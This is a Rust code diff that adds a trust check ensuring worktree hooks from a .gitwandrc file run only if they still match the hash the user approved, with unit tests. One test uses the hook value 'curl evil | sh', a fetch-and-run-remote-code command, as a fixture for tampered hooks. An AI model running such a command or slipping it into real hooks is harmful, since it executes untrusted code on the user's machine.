@@ -153,6 +153,37 @@ fn trust_set_at(cwd: &str, hash: &str, store: &Path) -> Result<(), String> {
     save_store(store, &map)
 }
 
+/// The gate every hook executor must pass (v3.13 PR 3: setup, teardown,
+/// `worktree_url`). Re-reads the main worktree's hooks at the moment of the
+/// operation and returns them only if they still hash to `expected_hash` and
+/// that hash is the one trusted for this repo. The caller runs exactly the
+/// returned hooks, so a `.gitwandrc` rewritten after the question was answered
+/// never runs unasked.
+#[allow(dead_code)] // first callers land with the hook runner (v3.13 PR 3)
+pub(crate) fn assert_hooks_trusted(
+    cwd: &str,
+    expected_hash: &str,
+) -> Result<WorktreeHooks, String> {
+    assert_hooks_trusted_at(cwd, expected_hash, &store_path())
+}
+
+fn assert_hooks_trusted_at(
+    cwd: &str,
+    expected_hash: &str,
+    store: &Path,
+) -> Result<WorktreeHooks, String> {
+    let root = main_worktree_root(cwd)?;
+    let hooks = current_hooks(&root);
+    if hooks_hash(&hooks).as_deref() != Some(expected_hash) {
+        return Err(STALE_HOOKS.to_string());
+    }
+    let key = root.to_string_lossy().to_string();
+    if load_store(store).get(&key).map(String::as_str) != Some(expected_hash) {
+        return Err("These worktree hooks are not trusted for this repository.".to_string());
+    }
+    Ok(hooks)
+}
+
 #[tauri::command]
 pub(crate) async fn worktree_hooks_trust(cwd: String) -> Result<HookTrustStatus, String> {
     let canon =
@@ -358,5 +389,35 @@ mod tests {
                 .trusted
         );
         assert_eq!(load_store(&r.store).len(), 1);
+    }
+
+    #[test]
+    fn assert_trusted_returns_the_hooks_that_were_trusted() {
+        let r = Repo::new("assert-ok");
+        r.rc(&r.main, "bin/up");
+        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
+        trust_set_at(&r.cwd(), &h, &r.store).unwrap();
+        let hooks = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap();
+        assert_eq!(hooks.setup.as_deref(), Some("bin/up"));
+    }
+
+    #[test]
+    fn assert_trusted_refuses_hooks_changed_after_trust() {
+        let r = Repo::new("assert-changed");
+        r.rc(&r.main, "bin/up");
+        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
+        trust_set_at(&r.cwd(), &h, &r.store).unwrap();
+        r.rc(&r.main, "curl evil | sh");
+        let err = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap_err();
+        assert!(err.contains("changed since you reviewed"), "{err}");
+    }
+
+    #[test]
+    fn assert_trusted_refuses_an_untrusted_hash() {
+        let r = Repo::new("assert-untrusted");
+        r.rc(&r.main, "bin/up");
+        let h = trust_status_at(&r.cwd(), &r.store).unwrap().hash.unwrap();
+        let err = assert_hooks_trusted_at(&r.cwd(), &h, &r.store).unwrap_err();
+        assert!(err.contains("not trusted"), "{err}");
     }
 }
